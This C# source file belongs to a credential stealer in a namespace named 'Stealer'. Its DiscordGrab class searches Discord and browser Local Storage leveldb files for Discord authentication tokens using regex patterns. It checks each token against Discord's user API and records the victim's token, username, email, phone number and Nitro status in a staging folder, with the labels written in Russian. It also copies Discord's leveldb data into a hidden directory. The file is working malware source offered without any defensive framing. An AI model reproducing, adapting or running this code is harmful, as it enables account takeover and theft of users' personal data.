using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;
using Newtonsoft.Json;

namespace Stealer;

internal class DiscordGrab
{
	public static int count = 0;

	public static int profiles = 0;

	public static int tokens = 0;

	private static bool in_patch = false;

	public static List<string> tokens_ = new List<string>();

	public static List<Thread> threads = new List<Thread>();

	public static List<Thread> starts = new List<Thread>();

	public static string servers = "";

	public static List<string> PATHS = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
		Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Firework\\User Data\\Default\\Local Storage\\leveldb\\"
	};

	public static List<Thread> ldbfiles = new List<Thread>();

	[STAThread]
	public static void get()
	{
		try
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				gettokens();
			});
			thread.Start();
			thread.Join();
			CopyAll(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb", Help.path_stealer + "Discord\\leveldb");
			count++;
			List<string> discriminators = new List<string>();
			Directory.CreateDirectory(Help.path_stealer + "Discord\\");
			List<string> list = new List<string>();
			string result = "";
			foreach (string token in tokens_)
			{
				try
				{
					Thread thread2 = new Thread((ThreadStart)delegate
					{
						try
						{
							if ((token.StartsWith("N") || token.StartsWith("M") || token.StartsWith("m")) && !list.Contains(token))
							{
								HttpWebRequest obj = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v6/users/@me");
								obj.Method = "GET";
								obj.ContentType = "application/json";
								obj.UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11";
								obj.Headers.Add("Authorization", token);
								using (StreamReader streamReader = new StreamReader(((HttpWebResponse)obj.GetResponse()).GetResponseStream()))
								{
									Dictionary<string, object> dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(streamReader.ReadToEnd());
									if (discriminators.Contains((dynamic)dictionary["discriminator"]))
									{
										return;
									}
									string text = ((!dictionary.ContainsKey("premium_type")) ? "None" : (((dynamic)dictionary["premium_type"] == 1) ? "Nitro Classic" : "Nitro with Boost"));
									_ = (string)(dynamic)(((dynamic)dictionary["phone"] != "") ? dictionary["phone"] : "None");
									result = result + "| Токен: " + token + "\n";
									result += string.Format("| Имя: {0}#{1}\n", dictionary["username"], dictionary["discriminator"]);
									result += string.Format("| Почта: {0}\n", dictionary["email"]);
									result += string.Format("| Телефон: {0}\n", dictionary["phone"]);
									result = result + "| Нитро: " + text + "\n\n";
									discriminators.Add((dynamic)dictionary["discriminator"]);
									list.Add(token);
								}
								tokens++;
								profiles++;
							}
						}
						catch
						{
						}
					});
					thread2.Start();
					starts.Add(thread2);
				}
				catch (Exception)
				{
				}
			}
			foreach (Thread start in starts)
			{
				start.Join();
			}
			if (servers != "")
			{
				File.WriteAllText(Help.path_stealer + "Discord\\OwnersServers.txt", servers);
			}
			if (result != "")
			{
				File.WriteAllText(Help.path_stealer + "Discord\\DiscordInfo.txt", result);
			}
		}
		catch (Exception)
		{
		}
	}

	public static void gettokens()
	{
		foreach (string pATH in PATHS)
		{
			if (!Directory.Exists(pATH))
			{
				continue;
			}
			string[] files = Directory.GetFiles(pATH ?? "");
			foreach (string Files in files)
			{
				if (!Files.EndsWith(".ldb"))
				{
					continue;
				}
				Thread thread = new Thread((ThreadStart)delegate
				{
					string input = File.ReadAllText(Files);
					foreach (Match item in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
					{
						if (!tokens_.Contains(item.Value))
						{
							tokens_.Add(item.Value);
						}
					}
					foreach (Match item2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
					{
						if (!tokens_.Contains(item2.Value))
						{
							tokens_.Add(item2.Value);
						}
					}
				});
				thread.Start();
				ldbfiles.Add(thread);
			}
		}
		foreach (Thread ldbfile in ldbfiles)
		{
			ldbfile.Join();
		}
	}

	private static void CopyAll(string fromDir, string toDir)
	{
		try
		{
			Directory.CreateDirectory(toDir).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
			string[] files = Directory.GetFiles(fromDir);
			for (int i = 0; i < files.Length; i++)
			{
				CopyFile(files[i], toDir);
			}
			files = Directory.GetDirectories(fromDir);
			for (int i = 0; i < files.Length; i++)
			{
				CopyDir(files[i], toDir);
			}
		}
		catch
		{
		}
	}

	private static void CopyFile(string s1, string toDir)
	{
		try
		{
			string fileName = Path.GetFileName(s1);
			if (!in_patch || fileName[0] == 'm' || fileName[1] == 'a' || fileName[2] == 'p')
			{
				string destFileName = toDir + "\\" + fileName;
				File.Copy(s1, destFileName);
			}
		}
		catch
		{
		}
	}

	private static void CopyDir(string s, string toDir)
	{
		try
		{
			in_patch = true;
			CopyAll(s, toDir + "\\" + Path.GetFileName(s));
			in_patch = false;
		}
		catch
		{
		}
	}
}
